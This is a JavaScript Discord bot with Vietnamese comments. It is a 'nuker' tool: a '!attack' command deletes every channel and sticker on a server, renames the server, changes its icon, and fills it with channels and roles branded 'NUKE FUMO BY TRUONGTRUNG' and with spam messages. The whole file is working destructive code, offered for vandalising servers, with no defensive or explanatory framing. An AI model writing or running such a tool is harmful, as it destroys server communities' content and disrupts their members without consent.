const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');
const sizeOf = require('image-size'); // Thư viện để kiểm tra kích thước ảnh

// Đọc tệp config.json
async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

async function validateImage(filePath) {
    console.log(`Validating image: ${filePath}`);
    const imageBuffer = await fs.readFile(filePath);
    const dimensions = sizeOf(imageBuffer);

    console.log(`Image dimensions: ${dimensions.width}x${dimensions.height}, type: ${dimensions.type}`);

    if (dimensions.type !== 'png' && dimensions.type !== 'apng') {
        throw new Error('Image must be in PNG or APNG format');
    }

    const stats = await fs.stat(filePath);
    console.log(`Image size: ${stats.size} bytes`);

    if (stats.size > 500 * 1024) {
        throw new Error('Image size must be less than 500 KB');
    }

    if (dimensions.width < 320 || dimensions.height < 320 || dimensions.width > 4096 || dimensions.height > 4096) {
        throw new Error('Image dimensions must be between 320x320 and 4096x4096 pixels');
    }

    return imageBuffer;
}

async function main() {
    const config = await loadConfig();

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    const prefix = '!';

    client.once('ready', () => {
        console.log(`Logged in as ${client.user.tag}!`);
    });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith(prefix) || message.author.bot) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'attack') {
            console.log('Attack command received');

            // Xóa tất cả các kênh
            message.guild.channels.cache.forEach(channel => channel.delete().catch(console.error));

            // Đổi tên máy chủ
            await message.guild.setName(config.newServerName).catch(console.error);

            // Thay ảnh đại diện máy chủ
            const iconJpg = await fs.readFile('./icon.jpg');
            message.guild.setIcon(iconJpg).catch(console.error);

            // Tạo các kênh mới
            const newChannels = [];
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 })); // 0 là kiểu Text Channel
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 }));
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 }));
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 }));
            newChannels.push(await message.guild.channels.create({ name: 'NUKE FUMO BY TRUONGTRUNG', type: 0 }));

            // Gửi tin nhắn đến kênh cuối cùng đã tạo
            for (const channel of newChannels) {
                await channel.send(`${channel.name} đã tạo`).catch(console.error);
            }

            // Tạo các vai trò mới
            await message.guild.roles.create({ name: 'NUKE FUMO BY TRUONGTRUNG', permissions: [] }).catch(console.error);
            await message.guild.roles.create({ name: 'NUKE FUMO BY TRUONGTRUNG', permissions: [] }).catch(console.error);

            // Xóa tất cả các sticker hiện có
            const stickers = await message.guild.stickers.fetch();
            for (const sticker of stickers.values()) {
                await sticker.delete().catch(console.error);
                console.log(`Deleted sticker: ${sticker.name}`);
            }

            // Kiểm tra và tạo 5 sticker mới từ tệp converted_image.png
            try {
                const iconPngBuffer = await validateImage('./converted_image.png');
                for (let i = 1; i <= 5; i++) {
                    await message.guild.stickers.create({
                        file: iconPngBuffer,
                        name: `Sticker${i}`,
                        description: `Description for Sticker${i}`,
                        tags: `sticker${i}`
                    }).catch(console.error);
                    console.log(`Created sticker: Sticker${i}`);
                }
            } catch (error) {
                console.error('Error validating or creating sticker:', error);
            }
        }
    });

    client.login(config.token);
}

main().catch(console.error);
